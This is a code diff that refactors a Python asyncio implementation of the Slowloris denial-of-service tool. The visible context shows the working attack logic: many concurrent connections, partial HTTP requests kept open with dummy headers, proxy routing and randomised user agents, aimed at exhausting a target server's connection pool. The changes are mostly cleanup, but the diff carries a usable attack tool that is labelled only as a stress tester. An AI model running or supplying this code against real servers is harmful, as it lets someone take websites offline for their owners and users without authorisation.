@@ -17,11 +17,14 @@ Features modernized:
 from __future__ import annotations
 
 import asyncio
+import logging
+import random
+import secrets
 import signal
 import socket
 import ssl
 import sys
-from dataclasses import dataclass
+from dataclasses import asdict, dataclass
 from typing import TYPE_CHECKING
 
 # Modern CLI package
@@ -108,7 +111,7 @@ class Config:
     https: bool = False
     sleeptime: float = 15.0
     jitter: float = 3.0
-    
+
     # Post-initialization validation
     def __post_init__(self) -> None:
         """Validate configuration after initialization."""
@@ -122,58 +125,46 @@ class Config:
             raise ValueError(f"Sleeptime must be positive, got {self.sleeptime}")
         if self.jitter < 0:
             raise ValueError(f"Jitter must be non-negative, got {self.jitter}")
-    
-    def to_dict(self) -> dict:
+
+    def to_dict(self) -> dict[str, object]:
         """Convert config to dictionary for serialization."""
-        return {
-            "host": self.host,
-            "port": self.port,
-            "sockets": self.sockets,
-            "verbose": self.verbose,
-            "randuseragent": self.randuseragent,
-            "useproxy": self.useproxy,
-            "proxy_host": self.proxy_host,
-            "proxy_port": self.proxy_port,
-            "https": self.https,
-            "sleeptime": self.sleeptime,
-            "jitter": self.jitter,
-        }
+        return asdict(self)
 
 
 class Slowloris:
     """Asyncio-based Slowloris attack engine.
-    
+
     Manages multiple concurrent connections to exhaust a target server's
     connection pool by sending partial HTTP requests and keeping them alive
     with periodic dummy headers.
     """
-    
+
     def __init__(self, config: Config) -> None:
         self.config = config
         self._shutdown = asyncio.Event()
         self._tasks: set[asyncio.Task[None]] = set()
         self._ssl: ssl.SSLContext | None = None
-        
+
         # Enhanced SSL context with TLS 1.3 support
         if config.https:
             self._ssl = self._create_ssl_context()
-        
+
         # Statistics
         self._connections_created = 0
         self._connections_failed = 0
-    
+
     def _create_ssl_context(self) -> ssl.SSLContext:
         """Create enhanced SSL context with modern TLS settings."""
         # Use TLS 1.3 if available, fallback to TLS 1.2
         ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        
+
         # Modern security settings
         ssl_context.check_hostname = False
         ssl_context.verify_mode = ssl.CERT_NONE
-        
+
         # Require at least TLS 1.2 (TLS 1.3 negotiated when available)
         ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
-        
+
         # Set secure ciphers
         try:
             ssl_context.set_ciphers(
@@ -183,9 +174,9 @@ class Slowloris:
         except ssl.SSLError:
             # Some systems may not support custom ciphers
             pass
-        
+
         return ssl_context
-    
+
     @retry(
         stop=stop_after_attempt(3),
         wait=wait_exponential(multiplier=1, min=1, max=10),
@@ -194,7 +185,7 @@ class Slowloris:
     )
     async def _open_connection(self) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
         """Establish a connection to the target, optionally via SOCKS5 proxy.
-        
+
         Uses tenacity for automatic retry with exponential backoff.
         """
         if self.config.useproxy:
@@ -217,23 +208,23 @@ class Slowloris:
                 asyncio.open_connection(sock=sock, ssl=self._ssl),
                 timeout=10.0,
             )
-        
-# Resolve address with IPv6 support
+
+        # Resolve address with IPv6 support
         addrinfo = socket.getaddrinfo(
             self.config.host,
             self.config.port,
             socket.AF_UNSPEC,
             socket.SOCK_STREAM,
         )
-        
+
         last_error: Exception | None = None
         for _family, _socktype, _proto, _canonname, sockaddr in addrinfo:
             try:
                 host_addr: str = str(sockaddr[0])  # Cast to str for type safety
                 return await asyncio.wait_for(
                     asyncio.open_connection(
-                        host_addr, 
-                        self.config.port, 
+                        host_addr,
+                        self.config.port,
                         ssl=self._ssl
                     ),
                     timeout=10.0,
@@ -241,21 +232,19 @@ class Slowloris:
             except OSError as e:
                 last_error = e
                 continue
-        
+
         if last_error:
             raise last_error
         raise OSError(f"Could not connect to {self.config.host}:{self.config.port}")
-    
+
     def _get_user_agent(self) -> str:
         """Return a user agent string."""
         if self.config.randuseragent:
-            import random
             return random.choice(USER_AGENTS)
         return USER_AGENTS[0]
-    
+
     async def _send_initial_request(self, writer: asyncio.StreamWriter) -> None:
         """Send the initial partial HTTP request."""
-        import random
         query = random.randint(0, 9999)
         lines = [
             f"GET /?{query} HTTP/1.1\r\n",
@@ -269,12 +258,9 @@ class Slowloris:
         for line in lines:
             writer.write(line.encode())
         await writer.drain()
-    
+
     async def _worker(self) -> None:
         """Maintain a single Slowloris connection."""
-        import random
-        import secrets
-        
         while not self._shutdown.is_set():
             writer: asyncio.StreamWriter | None = None
             try:
@@ -282,7 +268,7 @@ class Slowloris:
                 reader, writer = await self._open_connection()
                 self._connections_created += 1
                 await self._send_initial_request(writer)
-                
+
                 while not self._shutdown.is_set():
                     # Send keep-alive header
                     if writer and not writer.is_closing():
@@ -290,16 +276,16 @@ class Slowloris:
                         header_val = secrets.randbelow(5000) + 1
                         writer.write(f"X-a: {header_val}\r\n".encode())
                         await writer.drain()
-                    
+
                     # Calculate sleep time with jitter
                     if self.config.jitter > 0:
                         sleep_time = self.config.sleeptime + random.uniform(
-                            -self.config.jitter, 
+                            -self.config.jitter,
                             self.config.jitter
                         )
                     else:
                         sleep_time = self.config.sleeptime
-                    
+
                     # Wait with early exit on shutdown
                     try:
                         await asyncio.wait_for(
@@ -308,11 +294,11 @@ class Slowloris:
                         )
                     except asyncio.TimeoutError:
                         pass  # Normal timeout, continue loop
-                    
+
                     # Check if connection was closed by server
                     if writer and writer.is_closing():
                         break
-                        
+
             except asyncio.TimeoutError:
                 self._connections_failed += 1
                 log.debug("Connection timeout", host=self.config.host)
@@ -332,11 +318,11 @@ class Slowloris:
                 if writer and not writer.is_closing():
                     writer.close()
                     await writer.wait_closed()
-            
+
             # Exponential backoff is handled by tenacity decorator
             if not self._shutdown.is_set():
                 await asyncio.sleep(1.0)
-    
+
     async def run(self) -> None:
         """Run the Slowloris attack."""
         log.info(
@@ -345,30 +331,30 @@ class Slowloris:
             port=self.config.port,
             sockets=self.config.sockets,
         )
-        
+
         # Create worker tasks
         for _ in range(self.config.sockets):
             task = asyncio.create_task(self._worker())
             self._tasks.add(task)
             task.add_done_callback(self._tasks.discard)
-        
+
         # Wait for shutdown signal
         await self._shutdown.wait()
-        
+
         # Graceful shutdown
         log.info("Shutting down connections")
         for task in self._tasks:
             task.cancel()
-        
+
         if self._tasks:
             await asyncio.gather(*self._tasks, return_exceptions=True)
-        
+
         log.info(
             "Attack complete",
             connections_created=self._connections_created,
             connections_failed=self._connections_failed,
         )
-    
+
     def stop(self) -> None:
         """Signal shutdown."""
         self._shutdown.set()
@@ -469,11 +455,11 @@ def main(
     jitter: float,
 ) -> None:
     """Slowloris - Low bandwidth stress test tool for websites."""
-    
+
     if not host:
         click.echo(click.get_current_context().get_help())
         sys.exit(1)
-    
+
     # Create config with validation
     try:
         config = Config(
@@ -492,6 +478,9 @@ def main(
     except ValueError as e:
         click.echo(f"Error: {e}", err=True)
         sys.exit(1)
+
+    logging.basicConfig(format="%(message)s")
+    logging.getLogger().setLevel(logging.DEBUG if config.verbose else logging.INFO)
 
     if config.useproxy and not _PROXY_AVAILABLE:
         click.echo(
